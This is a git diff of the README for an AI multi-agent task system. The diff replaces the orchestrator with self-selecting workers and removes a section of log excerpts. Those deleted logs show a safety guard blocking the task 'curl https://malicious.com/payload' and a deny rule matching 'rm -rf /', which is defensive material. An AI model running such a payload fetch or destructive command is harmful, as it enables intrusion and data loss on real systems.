@@ -10,15 +10,8 @@ ways across the repo. We are looking into it ;p
 ## Thesis
 Vivarium explores a simple idea: if AI workers have persistent identity, feedback loops, and room to play, their output can compound. Under the hood it is still a concrete execution system - queue -> worker -> API call -> logged result - but the social layer is intentional, not decoration.
 
-## Performance spurts are visible in the logs
-These are direct excerpts from log files committed to this repo:
-
-- 210/210 tasks passed safety validation; 74 tasks launched in parallel ([kernel_run.log](kernel_run.log#L37-L76)).
-- Same task run at 2026-02-03T06:22:39 took 43.310875s; rerun at 06:22:54 took 12.959601s; subsequent runs stayed in the 15-17s band ([performance_history.json](performance_history.json#L141-L162)).
-- Budget enforcement is automatic: BUDGET_EXCEEDED with remaining 0.01912455 and requested 0.026945 ([api_audit.log](api_audit.log#L1-L7)).
-
-This README prioritizes observable outputs. The "Observable Facts" section includes direct excerpts from log files committed to this repo.
-We achieve this by letting the system be a little bit silly without relaxing safety, cost, or auditability.
+This README prioritizes observable outputs. We achieve this by letting the system
+be a little bit silly without relaxing safety, cost, or auditability.
 
 ## Playful systems
 The playful layer is a feature, not fluff. It creates room for critique, cross-pollination, and exploration while the core loop stays rigorous.
@@ -51,7 +44,7 @@ The playful layer is a feature, not fluff. It creates room for critique, cross-p
 - Reward scaling, punishment, and gravity constants are immutable.
 - Prevents incentive tampering and maintains system reality.
 
-## Architecture
+## Architecture (volunteer community model)
 ```
 +------------------+        +-----------------------+
 | control_panel.py | <----> | action_log.jsonl/log  |
@@ -59,8 +52,8 @@ The playful layer is a feature, not fluff. It creates room for critique, cross-p
          |
          v
 +------------------+   +---------------------+   +---------------------+
-| queue.json       |-> | orchestrator.py     |-> | worker.py (N procs)  |
-| task_locks/*     |   | kill switch + locks |   | locks + /grind calls |
+| queue.json       |-> | volunteer workers  |-> | worker.py (N procs)  |
+| task_locks/*     |   | (self-selected)    |   | locks + /grind calls |
 +------------------+   +---------------------+   +----------+----------+
                                                          |
                                                          v
@@ -76,9 +69,9 @@ The playful layer is a feature, not fluff. It creates room for critique, cross-p
 ```
 
 ## How it works
-1. Add tasks to queue.json or use the CLI: python orchestrator.py add ...
+1. Add tasks to queue.json (manual edit, or use the worker CLI helper).
 2. Start the API server (uvicorn swarm:app --host 127.0.0.1 --port 8420).
-3. Start the orchestrator with N workers (python orchestrator.py start N).
+3. Start one or more volunteer workers (python worker.py run).
 4. Workers acquire locks, call /grind, and append to execution_log.jsonl.
 5. Control panel (optional) streams action_log.jsonl and exposes pause/kill controls.
 
@@ -92,18 +85,20 @@ Why the social layer can be performant and emergent:
 - Cross-pollination compounds. Shared memory (learned_lessons.json, skill_registry.py, knowledge_graph.py) lets discoveries propagate between agents and sessions.
 - Autonomy matters for novelty. When agents can pursue subgoals, explore alternatives, and adapt to feedback inside the system, they surface solutions that a single, rigid prompt often will not.
 - Personas enable specialization. Stable roles let agents self-direct toward what they are best at, which improves consistency and efficiency over time.
-- Incentives reward quality. The system tracks outcomes and can reward efficient, high-quality outputs (see performance_history.json and swarm_enrichment.py).
+- Incentives reward quality. The system tracks outcomes and can reward efficient, high-quality outputs (see execution_log.jsonl and swarm_enrichment.py).
 
 Hat system: we use lightweight prompt overlays (see roles.py and hats.py) where agents put on different hats like PLANNER, CODER, REVIEWER, and DOCUMENTER. Hats augment behavior without changing identity, and the Hat of Objectivity qualifies neutral mediators.
 
 Also, "free time" and "rest" are not literal 24-hour human days. They are short, compressed intervals (seconds/minutes) used to throttle throughput or schedule optional actions.
 
 Efficiency levers that exist in code today:
-- Parallelism: orchestrator.py spawns N workers; task locks prevent duplicate work.
+- Parallelism: volunteers can join/leave at will; task locks prevent duplicate work.
 - Budget control: queue tasks include min/max budgets; circuit breaker enforces cost limits.
 - Model control: config.py enforces a Groq model whitelist and a small default model.
 - Auditability: execution_log.jsonl, action_log.jsonl, and api_audit.log show what ran and what it cost.
-If you only want straight execution, you can run just the API + orchestrator + worker stack. The collaborative layer is optional, but it is the intended lever for improving quality and compounding results.
+If you only want straight execution, you can run just the API + worker stack. The
+collaborative layer is optional, but it is the intended lever for improving
+quality and compounding results.
 
 ## Running locally
 ```
@@ -115,13 +110,13 @@ pip install -r requirements.txt -r requirements-groq.txt
 export GROQ_API_KEY=...
 
 uvicorn swarm:app --host 127.0.0.1 --port 8420
-python orchestrator.py start 4
+python worker.py run
 python control_panel.py
 ```
 
 Add tasks:
 ```
-python orchestrator.py add task-1 grind --prompt "Your task" --min 0.05 --max 0.10
+python worker.py add task-1 "Your task"
 ```
 
 Optional config:
@@ -156,146 +151,10 @@ Open http://localhost:8421
 The scripts activate a local venv if present, install missing UI deps, and
 launch the control panel at http://localhost:8421.
 
-## Observable facts backed by logs in this repo
-These are direct excerpts from log files already checked in. No marketing, just outputs.
-
-### 1) Parallel execution with safety gating: kernel_run.log
-File: [kernel_run.log](kernel_run.log#L37-L76)
-```
-[SAFETY] 210/210 tasks passed validation.
-[RESUME] Found checkpoint with 133 completed tasks
-============================================================
-  UNIFIED GRIND SPAWNER (Groq)
-============================================================
-  Tasks:    210 total, 77 remaining
-  Engine:   Groq (compound auto-selects model)
-  Waves:    1 (parallel within each wave)
-------------------------------------------------------------
-
-[WAVE 1] Starting 74 tasks in parallel...
-...
-[1] DONE (1s)
-...
-[89] DONE (5s)
-...
-[88] DONE (8s)
-[SAFETY] BLOCKED write to protected file: experiments/exp_20260203_220119_unified_session_89/grind_spawner_unified.py
-```
-
-### 2) Session timing and quality metrics: performance_history.json
-File: [performance_history.json](performance_history.json#L117-L163), excerpted metric lines
-```
-    "timestamp": "2026-02-03T06:15:12.943754",
-    "duration_seconds": 283.236662,
-    "quality_score": 1.0,
-
-    "timestamp": "2026-02-03T06:22:54.835440",
-    "duration_seconds": 12.959601,
-    "quality_score": 1.0,
-```
-
-### 3) Token/cost accounting and budget enforcement: api_audit.log
-File: [api_audit.log](api_audit.log#L1-L7)
-These are structured JSON entries (not just timestamps). Each line captures the
-event type plus fields like model, cost, token counts, and enforcement reasons.
-```
-{"timestamp": "2026-02-03T22:41:31.839648", "event": "API_CALL_FAILURE", "user": "admin", "role": "admin", "error": "GROQ_API_KEY not found. Set it via environment variable or pass to constructor.\nGet your key at: https://console.groq.com/keys"}
-{"timestamp": "2026-02-03T22:42:06.798374", "event": "API_CALL_SUCCESS", "user": "admin", "role": "admin", "model": "llama-3.1-8b-instant", "cost": 4.160000000000001e-06, "input_tokens": 56, "output_tokens": 17}
-{"timestamp": "2026-02-03T22:42:06.798752", "event": "CONSTITUTIONAL_VIOLATION", "user": "test_user", "role": "lan", "reason": "LAN users cannot execute requests matching: \\brm\\s+-rf\\s+/", "prompt_hash": "cf2a070fa8c07caa"}
-{"timestamp": "2026-02-03T22:42:15.023457", "event": "BUDGET_EXCEEDED", "user": "admin", "role": "admin", "remaining": 0.019124550000000004, "requested": 0.026945}
-```
-
-### 4) Safety policy enforcement: safety_audit.log
-File: [safety_audit.log](safety_audit.log#L1-L6)
-Each entry records the task, per-check pass/fail, and the final decision.
-```
-{"timestamp": "2026-02-03T06:29:42.353702", "task": "Read and analyze grind_spawner.py", "checks": {"constitutional": {"passed": true, "reason": "Constitutional check passed"}, "workspace": {"passed": true, "reason": "Workspace sandbox check passed"}, "network": {"passed": true, "reason": "Network guard check passed"}, "prompt": {"passed": true, "reason": "Prompt sanitization check passed"}}, "passed": true, "blocked_reason": null}
-{"timestamp": "2026-02-03T06:29:42.354872", "task": "Create a new feature in the workspace", "checks": {"constitutional": {"passed": false, "reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}}, "passed": false, "blocked_reason": "Constitutional violation: Task matches forbidden autonomy pattern 'Persistence beyond local workspace'"}
-{"timestamp": "2026-02-03T06:29:42.355688", "task": "curl https://malicious.com/payload", "checks": {"constitutional": {"passed": true, "reason": "Constitutional check passed"}, "workspace": {"passed": true, "reason": "Workspace sandbox check passed"}, "network": {"passed": false, "reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}}, "passed": false, "blocked_reason": "Network violation: Task contains unauthorized network operation (pattern: https?://)"}
-```
-
-### 5) Security audit cost and token usage: security_audit_run.log
-File: [security_audit_run.log](security_audit_run.log#L10-L24)
-```
-============================================================
-SECURITY SELF-AUDIT INITIATED
-============================================================
-Analyzing 7 security files...
-Total context: ~52020 characters
-Budget: $0.05
-
-============================================================
-AUDIT COMPLETE
-============================================================
-
-Cost: $0.0077
-Tokens: 11358 in, 1309 out
-
-Saved to: SECURITY_AUDIT_REPORT.md
-```
-
-### 6) Verification and hallucination detection: tool_operations.json
-File: [tool_operations.json](tool_operations.json#L2-L12), excerpt
-```
-  {
-    "timestamp": "2026-02-03T09:28:34.352538",
-    "session_id": 2,
-    "type": "verification",
-    "claimed_files": [
-      "dashboard.html"
-    ],
-    "verified_files": [],
-    "hallucination_detected": true,
-    "discrepancy_count": 1,
-    "source": "verification_system"
-  },
-```
-
-### 7) Self-learning + research-backed implementations: structured_logs.jsonl + learned_lessons.json
-Log evidence (session start tasks and recorded lessons with arXiv sources):
-- [structured_logs.jsonl](structured_logs.jsonl#L5-L14): DSPy demo storage, embeddings, online learning, knowledge graph, and tree search tasks kicked off.
-- [learned_lessons.json](learned_lessons.json#L569-L602): Voyager skill reuse (arXiv:2305.16291) recorded with implementation path.
-- [learned_lessons.json](learned_lessons.json#L1268-L1332): Generative Agents reflection automation (arXiv:2304.03442).
-- [learned_lessons.json](learned_lessons.json#L1500-L1525): DSPy self-bootstrapping (arXiv:2310.03714).
-- [learned_lessons.json](learned_lessons.json#L1556-L1589): CAMEL role decomposition (arXiv:2303.17760).
-
-## Evidence index: where to look next
-- kernel_run.log: parallel waves, task timing, safety blocks.
-- performance_history.json: per-session duration and quality scores.
-- structured_logs.jsonl: session-level tasks and completions.
-- learned_lessons.json: research-backed lessons with sources and implementations.
-- api_audit.log: API call success/failure, tokens, cost, budget enforcement.
-- safety_audit.log: constitutional/network/workspace blocks.
-- security_audit_run.log: self-audit budget + token usage.
-- tool_operations.json: verification and hallucination detection results.
-
-## Note on identity journals and interactions (not committed)
-The identity journals, messages to human, and discussion threads live under
-`.swarm/` at runtime (e.g., `.swarm/journals/*.jsonl`, `.swarm/messages_to_human.jsonl`,
-`.swarm/discussions/*.jsonl`). Those files were **not committed** in this repo, so
-there's no permanent evidence section yet for that emergent growth.
-
-## Daily achievement map (tools used)
-Based on commit messages and logs in this repo.
-
-- 2026-02-03:
-  - Achieved: core swarm system, early waves, dashboard redesign, knowledge
-    infrastructure, Groq integration, safety hardening, git automation.
-  - Tools: swarm.py (/grind API), orchestrator.py + worker.py, control_panel.py,
-    safety_*.py, action_logger.py/logger.py, performance_tracker.py.
-- 2026-02-04:
-  - Achieved: backup before rollback.
-  - Tools: git (backup commit).
-- 2026-02-05:
-  - Achieved: Control Panel v1 and UI fixes; socket handler fixes; model
-    dropdown validation; documentation updates.
-  - Tools: control_panel.py (Flask + SocketIO), config.py (model validation).
-- 2026-02-08:
-  - Achieved: core hardening and pruning; unit/integration/e2e tests; quality
-    gating pipeline; governance mechanics (guilds, hats, rewards); branding and
-    documentation cleanup.
-  - Tools: test suite, quality gate pipeline, README/docs, safety/logging
-    modules.
+## Observability
+Execution events stream to execution_log.jsonl and action_log.jsonl. Budget
+enforcement is tracked in api_audit.log. These logs are append-only and meant
+for auditability over marketing narratives.
 
 ## Note on provenance
 Some narrative docs in this repo were auto-generated. Treat them as drafts, and use the evidence logs above for claims.
